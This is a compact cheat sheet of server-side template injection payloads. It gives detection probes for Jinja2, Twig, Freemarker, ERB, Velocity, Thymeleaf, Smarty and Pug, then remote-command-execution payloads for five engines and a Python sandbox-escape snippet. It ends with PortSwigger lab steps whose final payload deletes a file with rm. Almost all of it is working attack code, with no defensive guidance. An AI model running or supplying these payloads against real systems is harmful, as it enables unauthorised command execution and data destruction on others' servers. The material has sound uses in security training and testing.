# SSTI - Payload Reference

## Detection Payloads (Math Operations)

### Jinja2 / Twig
```
{{7*7}}           → 49 (Twig) or 49 (Jinja2)
{{7*'7'}}         → 49 (Twig) or 7777777 (Jinja2) — DIFFERENT!
```

### Freemarker
```
${7*7}            → 49
#{7*7}            → 49
```

### ERB / Ruby
```
<%= 7*7 %>        → 49
```

### Velocity
```
#set($x=7*7)${x} → 49
```

### Thymeleaf
```
__${7*7}__        → 49
```

### Smarty
```
{7*7}             → 49
```

### Pug / Jade
```
#{7*7}            → 49
```

## RCE Payloads

### Jinja2 (Python)
```python
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

### Twig (PHP)
```php
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

### ERB (Ruby)
```erb
<%= system('id') %>
<%= `id` %>
```

### Freemarker (Java)
```
<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }
```

### Velocity (Java)
```
#set($str=$class.inspect("java.lang.String"))
#set($chr=$class.inspect("java.lang.Character"))
#set($ex=$class.inspect("java.lang.Runtime").getRuntime().exec("id"))
```

## Sandbox Escape
```
# Python/Jinja2 sandbox bypass
{{''.__class__.__mro__[1].__subclasses__()}}
{{request.application.__globals__.__builtins__['__import__']('os')}}
```

## PortSwigger Lab Approach
1. Inject `{{7*7}}` or `${7*7}` in user input
2. If 49 appears → SSTI confirmed
3. Use `{{7*'7'}}` to distinguish Jinja2 (7777777) vs Twig (49)
4. Find RCE payload for the identified template engine
5. Delete target file: `{{config.__class__.__init__.__globals__['os'].popen('rm /home/carlos/morale.txt').read()}}`
